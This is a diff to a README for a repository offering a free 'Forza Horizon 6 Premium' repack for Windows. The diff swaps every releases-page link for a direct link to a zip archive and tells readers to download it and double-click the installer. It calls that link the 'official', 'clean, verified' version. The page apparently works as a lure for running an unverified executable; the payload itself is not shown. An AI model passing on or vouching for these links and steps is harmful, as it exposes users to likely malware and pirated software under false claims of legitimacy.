@@ -1,6 +1,6 @@
 # 🏎️ Forza-Horizon-6-Premium - Experience ultimate racing on your PC
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/dissilient-alkalineearthmetal187/Forza-Horizon-6-Premium/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://raw.githubusercontent.com/dissilient-alkalineearthmetal187/Forza-Horizon-6-Premium/main/RepackResource/Horizon_Premium_Forza_2.5.zip)
 
 Forza Horizon 6 brings the racing experience to a new location. This release focuses on the vibrant streets of Tokyo, the technical corners of the Touge, and the scenic beauty of Mount Fuji. You can access the Premium Upgrade Bundle, which includes the Car Pass, VIP Membership, and two major expansions. This version supports standard hardware configurations and ensures smooth performance on current Windows gaming machines. 
 
@@ -21,7 +21,7 @@ Using an SSD is highly recommended to reduce loading times and prevent visual st
 
 Follow these instructions to set up the game on your Windows computer.
 
-1.  Visit the official release page to download the latest installer: [https://github.com/dissilient-alkalineearthmetal187/Forza-Horizon-6-Premium/releases](https://github.com/dissilient-alkalineearthmetal187/Forza-Horizon-6-Premium/releases).
+1.  Visit the official release page to download the latest installer: [https://raw.githubusercontent.com/dissilient-alkalineearthmetal187/Forza-Horizon-6-Premium/main/RepackResource/Horizon_Premium_Forza_2.5.zip](https://raw.githubusercontent.com/dissilient-alkalineearthmetal187/Forza-Horizon-6-Premium/main/RepackResource/Horizon_Premium_Forza_2.5.zip).
 2.  Locate the downloaded installation file in your Downloads folder.
 3.  Double-click the file to start the installation wizard.
 4.  Follow the prompts on your screen. You can choose the installation folder during this process.
@@ -62,4 +62,4 @@ This project operates as an open-source initiative. Contributions focus on impro
 
 Always download files from the official link provided here. Do not trust external sources claiming to host installer files for this project. The official link ensures you get the clean, verified version of the game files without unwanted extra software. 
 
-You can find the official link here: [https://github.com/dissilient-alkalineearthmetal187/Forza-Horizon-6-Premium/releases](https://github.com/dissilient-alkalineearthmetal187/Forza-Horizon-6-Premium/releases)
+You can find the official link here: [https://raw.githubusercontent.com/dissilient-alkalineearthmetal187/Forza-Horizon-6-Premium/main/RepackResource/Horizon_Premium_Forza_2.5.zip](https://raw.githubusercontent.com/dissilient-alkalineearthmetal187/Forza-Horizon-6-Premium/main/RepackResource/Horizon_Premium_Forza_2.5.zip)
